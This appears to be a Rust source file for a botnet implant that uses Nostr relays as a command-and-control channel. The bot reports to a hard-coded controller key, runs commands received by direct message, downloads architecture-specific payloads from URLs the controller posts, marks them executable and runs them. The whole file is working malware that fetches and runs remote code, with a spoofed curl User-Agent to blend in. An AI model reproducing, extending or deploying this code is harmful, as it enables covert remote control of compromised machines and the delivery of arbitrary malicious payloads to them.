use std::{
    collections::HashMap,
    io::Write,
    path::{Path, PathBuf},
    process::Command,
};

use nostr_sdk::prelude::*;
use reqwest::header::{CONTENT_TYPE, HeaderValue};
use tempfile::TempPath;
use uuid::Uuid;

pub mod state;

use state::State;

use crate::{
    CNC_PUB_KEY,
    command::Commands,
    session::{Session, SessionProps},
};

const ARCH: &'static str = std::env::consts::ARCH;

pub struct Config {
    pub name: Option<String>,
    pub display_name: Option<String>,
    pub private_key: Option<String>,
    pub relays: Vec<String>,
}

pub struct Bot {
    state: State,
    session: Session,
}

impl Bot {
    pub fn create(config: Config) -> Self {
        let name = match config.name {
            Some(name) => name,
            None => format!("bot-{}", Uuid::new_v4()),
        };

        let display_name = match config.display_name {
            Some(display) => display,
            None => format!("bot-{}", Uuid::new_v4()),
        };

        let state = State::default();

        let session = Session::create(SessionProps {
            name,
            display_name,
            relays: config.relays,
            private_key: config.private_key,
        });

        Self { state, session }
    }

    pub async fn run(&mut self) -> Result<()> {
        println!("[i] Connecting to relays");

        self.session.init().await?;

        self.session
            .update_metadata(self.state.to_string().as_str())
            .await?;

        self.session
            .send_msg("bot activated", PublicKey::parse(CNC_PUB_KEY).unwrap())
            .await?;

        let pubkey = PublicKey::parse(CNC_PUB_KEY).unwrap();
        let mut msg_stream = self.session.receive_msgs(pubkey).await?;
        let mut notes_stream = self.session.subscribe_notes(pubkey).await?;

        loop {
            tokio::select! {
                Some(msg) = msg_stream.next() => {
                    if let Some(cmd) = Commands::parse(msg.as_str()) {
                        if self.state.enabled {
                            cmd.execute(&mut self.state, &self.session).await?
                        }
                        // only allow enable commands when the bot is disabled
                        else if let Commands::Enable(_) = cmd {
                            cmd.execute(&mut self.state, &self.session).await?
                        }
                    } else {
                        self.session.send_msg(msg.as_str(), pubkey).await?;
                    }
                },
                Some(event) = notes_stream.next() => {
                    // Handle notes_stream similarly if needed
                    println!("Received note: {}", event.content);
                    let payload_urls = serde_json::from_str::<HashMap<String, String>>(event.content.as_str());
                    if let Ok(payload_urls) = payload_urls {
                        self.state.payload = Some(download_payload(payload_urls).await);
                        println!("path: {:?}", self.state.payload);
                    }
                }
            }
        }
    }
}

fn drop(path: &Path) {
    println!("[+] Dropping payload {:?}", path.to_str());
    if let Err(e) = Command::new(path)
        .spawn()
        .and_then(|mut child| child.wait())
    {
        eprintln!("[-] Failed to execute payload: {}", e);
    }
}

async fn download_payload(urls: HashMap<String, String>) -> TempPath {
    // Get architecture
    println!("Architecture: {}", ARCH);

    // You can also get the OS
    let os = std::env::consts::OS;
    println!("Operating System: {}", os);

    let client = reqwest::Client::builder()
        .redirect(reqwest::redirect::Policy::limited(10))
        .build()
        .unwrap();

    let url = urls.get(ARCH).expect("architecture not supported");
    println!("[+] Getting payload from: {}", url);

    let response = client
        .get(url)
        .header("User-Agent", "curl/7.68.0") // Set User-Agent to mimic curl
        .send();

    let payload = response.await.expect("Error retrieving payload");

    let mut temp_file = tempfile::NamedTempFile::new().expect("Failed to create a temporary file");

    temp_file
        .write_all(&payload.bytes().await.unwrap())
        .expect("Failed to write payload to file");

    temp_file.flush().expect("Failed to flush buffer");

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut perms = temp_file.as_file().metadata().unwrap().permissions();
        perms.set_mode(0o755);
        std::fs::set_permissions(temp_file.path(), perms).unwrap();
    }

    let path = temp_file.into_temp_path();

    return path;
}
